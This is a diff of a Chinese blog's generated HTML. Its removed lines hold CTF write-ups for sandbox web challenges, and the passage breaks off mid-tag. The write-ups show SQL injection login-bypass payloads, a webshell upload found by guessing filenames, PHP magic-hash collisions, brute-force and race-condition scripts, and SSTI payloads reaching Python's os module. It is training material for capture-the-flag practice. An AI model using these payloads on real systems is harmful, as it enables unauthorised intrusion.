+<li><a href="#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">禁止套娃</a></li>
+<li><a href="#babyupload">BabyUpload</a><ul>
+<li><a href="#img-srchttpsimg-blogcsdnimgcn20200916144920251pngx-oss-processimagewatermarktype_zmfuz3pozw5nagvpdgkshadow_10text_ahr0chm6ly9ibg9nlmnzzg4ubmv0l3dlaxhpbl80mzu3odq5mgsize_16color_fffffft_70pic_center-alt%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0">!在这里插入图片描述</a></li>
+</ul>
+</li>
+<li><a href="#strongestmind">StrongestMind</a></li>
+<li><a href="#babysqliv30">BabysqliV3.0</a></li>
+<li><a href="#end">END</a></li>
+</ul>
+<!-- /TOC -->
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/K4H6SZ/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -615,7 +473,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/197BKC8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -629,7 +487,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">2017-赛客夏令营-Web全家桶</a>
+            <a href="/2020/197BKC8/" class="post-title-link" itemprop="url">2017-赛客夏令营-Web全家桶</a>
         </h2>
 
         <div class="post-meta">
@@ -646,7 +504,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:26" itemprop="dateModified" datetime="2020-09-28T22:07:26+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:25:11" itemprop="dateModified" datetime="2020-09-30T09:25:11+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -664,14 +522,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>4.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -683,68 +541,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<blockquote>
+          <blockquote>
 <p>题目来自CTFHub，感谢平台的复现环境</p>
 </blockquote>
 <hr>
-<p>@<a href="2017-%E8%B5%9B%E5%AE%A2%E5%A4%8F%E4%BB%A4%E8%90%A5">TOC</a></p>
-<hr>
-<h1 id="Injection-V2-0"><a href="#Injection-V2-0" class="headerlink" title="Injection V2.0"></a>Injection V2.0</h1><blockquote>
-<p>登陆查询的两种方式，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-py/articles/13509942.html">参考博客</a></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200912000210144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912000237799.png#pic_center" alt="在这里插入图片描述"><br>提交按钮是提交查询，看来不用登陆哈哈，这种查询一般有两种方式</p>
-<ul>
-<li>一种是先查询用户名是否存在，在查询对应密码是否正确</li>
-<li>一种是直接查询用户提交的账号密码是否正确<br>输入账号admin密码admin提示密码错误，应该是第一种查询方式<br>fuzz发现函数基本都被过滤了，那么根据密码查询逻辑可以这样构造payload<code>user=123&#39;union/**/select/**/1/**/%23&amp;pass=1</code><img src="https://img-blog.csdnimg.cn/20200912001007870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912002139367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><blockquote>
-<p>写在最后，payload最后的pass需要与select的数字相同，这是因为查询密码时<code>if($row[&#39;password&#39;]==$password)</code>前面的是你select的值，后面是你输入的pass</p>
-</blockquote>
-</li>
-</ul>
-<hr>
-<h1 id="Uploadddd"><a href="#Uploadddd" class="headerlink" title="Uploadddd"></a>Uploadddd</h1><blockquote>
-<p>知识点：目录扫描，简单代码审计，基本脚本编写</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200911233047467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200911233100587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>传个🐎试试，发现可以上传成功，但是没有路径，传其他 的也是这样，都没有路径。<br><img src="https://img-blog.csdnimg.cn/202009112331322.png#pic_center" alt="在这里插入图片描述"><br>扫描目录试试，有个备份文件，下载下来恢复一下<br><img src="https://img-blog.csdnimg.cn/20200911234232793.png#pic_center" alt="在这里插入图片描述"><br>下载完使用<code>vim -r .index.php.swp</code>恢复文件，发现文件存在<code>uploads/</code>下，文件名是文件上传时间加一个随机数组成，在上传一次，用脚本爆破一下看看那个随机数就行了<br><img src="https://img-blog.csdnimg.cn/20200911234410442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包看下上传时间，脚本生成字典<br><img src="https://img-blog.csdnimg.cn/20200911234711286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">time = <span class="string">&#x27;20200911154632&#x27;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    value += time+str(i)+<span class="string">&#x27;.php&#x27;</span></span><br><span class="line">    value += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="comment">#print(value)</span></span><br><span class="line">filename = <span class="string">&#x27;dir.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> value:</span><br><span class="line">        f.writelines(i)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200911235743394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20200911235717519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连🐎，完活<br><img src="https://img-blog.csdnimg.cn/20200911235922997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="weakphp"><a href="#weakphp" class="headerlink" title="weakphp"></a>weakphp</h1><blockquote>
-<p>知识点：git源码泄露；php弱类型；md5碰撞</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200903233217744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200903233226488.png#pic_center" alt="在这里插入图片描述"><br>源码没看到什么东西，抓包看看，没发现啥，扫描器启动233<br><img src="https://img-blog.csdnimg.cn/20200903234005135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>很明显了，git泄露，用GitHack恢复一下<br><img src="https://img-blog.csdnimg.cn/20200903234207163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入dist目录，查看恢复源码<br><img src="https://img-blog.csdnimg.cn/20200903234344763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>主要绕过<code>(md5($user) == md5($pass)) and ($user != $pass)</code>，要求user与pass不同，但其md5加密后却相同，典型的md5碰撞。</p>
-<blockquote>
-<p>php在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php弱类型参考博客</a></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">0e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
-<p>随便取出来两个用就好<br><img src="https://img-blog.csdnimg.cn/2020090323495491.png#pic_center" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><blockquote>
-<p>知识点：爆破方式</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200903231423987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200903231440870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>不断刷新页面发现当前数字也不同，如题，random。<br>==第一种==burp爆破<br><img src="https://img-blog.csdnimg.cn/20200903232104270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脸黑，第一次失败了，再来一次，第二次一下就出来了。。。<br><img src="https://img-blog.csdnimg.cn/20200903232223115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>==第二种==py脚本，锻炼写脚本的能力<br>因为懒没写正则，直接把页面全输出了哈哈哈</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-c5ef534a16bbc86d.sandbox.ctfhub.com:10080/index.php?num=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	response = requests.get(url+str(i))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;ctfhub&#123;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">		print(response.text)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200903232808219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h1><blockquote>
-<p>知识点：SQL的数字型注入<br>Practice makes perfect.God helps those who help themselves.Where there is a will,there is a way.One false step will make a great difference.</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200903230128286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>进入题目<br><img src="https://img-blog.csdnimg.cn/20200903230115972.png#pic_center" alt="在这里插入图片描述"><br>id=2-1发现数字型注入<br><img src="https://img-blog.csdnimg.cn/2020090323020594.png#pic_center" alt="在这里插入图片描述"><br>查有几个字段，2的时候正常，3不正常，说明字段为2<br><img src="https://img-blog.csdnimg.cn/20200903230302805.png#pic_center" alt="在这里插入图片描述"></p>
-<p>查表名</p>
-<p><img src="https://img-blog.csdnimg.cn/20200903230531540.png#pic_center" alt="在这里插入图片描述"><br>查列名<br><img src="https://img-blog.csdnimg.cn/20200903230616806.png#pic_center" alt="在这里插入图片描述"><br>查字段<br><img src="https://img-blog.csdnimg.cn/20200903230707346.png#pic_center" alt="在这里插入图片描述"><br>当然，sqlmap一把梭也行（我没试）</p>
-<hr>
-<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p><img src="https://img-blog.csdnimg.cn/20200904000212544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开链接啥都没有，抓包看看<br><img src="https://img-blog.csdnimg.cn/20200904000324926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>。。。这题没有知识点，<a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3">base64解密</a></p>
-<hr>
-<h1 id="Fast-Running"><a href="#Fast-Running" class="headerlink" title="Fast Running"></a>Fast Running</h1><p><img src="https://img-blog.csdnimg.cn/20200908144255133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200908144315201.png#pic_center" alt="在这里插入图片描述"></p>
-<p>尝试弱密码登陆，失败；修改密码在登陆，也是失败，应该是后台又改掉了。我也是第一次做多线程题，还是看的别师傅的wp，<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107579378">参考博客</a><br>用python的threading模块可以实现多线程，只要你登陆的速度比后台改密码的速度快应该就可以了，上代码。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.item = item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        main(self.item)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> args == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ur11 = <span class="string">&#x27;http://challenge-2ac70a122538fa92.sandbox.ctfhub.com:10080/change_passwd.php?passwd=123456&amp;passwd_confirm=123456&#x27;</span></span><br><span class="line">            c = s.get(ur11).content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url2 = <span class="string">&#x27;http://challenge-2ac70a122538fa92.sandbox.ctfhub.com:10080/login_check.php?passwd=123456&#x27;</span></span><br><span class="line">            <span class="comment"># c11 = s.get(url2, data=&#123;&#x27; passwd&#x27;: 111&#125;).content</span></span><br><span class="line">            c1 = s.get(url2)</span><br><span class="line">            print(c1.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = MyThread(<span class="number">1</span>)</span><br><span class="line">    t2 = MyThread(<span class="number">2</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure>
-<hr>
-<h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><p><img src="https://img-blog.csdnimg.cn/20200912002654137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<!-- TOC -->
 
+<ul>
+<li><a href="#injection-v20">Injection V2.0</a></li>
+<li><a href="#uploadddd">Uploadddd</a></li>
+<li><a href="#weakphp">weakphp</a></li>
+<li><a href="#random">random</a></li>
+<li><a href="#injection">injection</a></li>
+<li><a href="#checkin">checkin</a></li>
+<li><a href="#fast-running">Fast Running</a></li>
+<li><a href="#done">DONE</a></li>
+</ul>
+<!-- /TOC -->
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/197BKC8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -763,7 +584,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/GD3NE8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -777,7 +598,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">buuoj BJDCTF-2nd WP</a>
+            <a href="/2020/GD3NE8/" class="post-title-link" itemprop="url">buuoj BJDCTF-2nd WP</a>
         </h2>
 
         <div class="post-meta">
@@ -794,7 +615,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:25" itemprop="dateModified" datetime="2020-09-28T22:07:25+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:33:11" itemprop="dateModified" datetime="2020-09-30T09:33:11+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -812,14 +633,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>1.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -831,34 +652,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<blockquote>
-<p>复现地址：buuoj.cn</p>
+          <blockquote>
+<p>复现地址：buuoj.cn<br>ssti的简单使用</p>
 </blockquote>
-<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><blockquote>
-<p>ssti的简单使用</p>
-</blockquote>
-<p>打开复现地址是一个Google页面<br><img src="https://img-blog.csdnimg.cn/20200611075142860.png" alt="在这里插入图片描述"><br>随便搜索一下看了源码提示ssti</p>
-<blockquote>
-<p>SSTI又叫服务端模板注入攻击<br>推荐先知师傅的一篇入门教程：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200611075232196.png" alt="在这里插入图片描述"><br>那就试试ssti能不能用吧，<code>?name=&#123;&#123;1-1&#125;&#125;</code>下面输出却是0，说明注入是可以的<br><img src="https://img-blog.csdnimg.cn/20200611075751716.png" alt="在这里插入图片描述"><br>列出基类，<code>?name=&#123;&#123;"".__class__.__base__&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/20200611080032266.png" alt="在这里插入图片描述"><br>列出其子类，<code>?name=&#123;&#123;"".__class__.__base__.__subclasses__()&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/20200611080133962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有这么多，我们需要查找到有==os==类的子类，可以看到确实有一个这样的类，现在就是找到他的下标，肯定不会一个一个数鸭哈哈，写个脚本（当然也能用bp爆破），在上一条payload的后面加上<code>[]</code>就行，就像是找数组里面的值（<code>?name=&#123;&#123;"".__class__.__base__.__subclasses__()[110]&#125;&#125;</code>）<br><img src="https://img-blog.csdnimg.cn/20200611080619702.png" 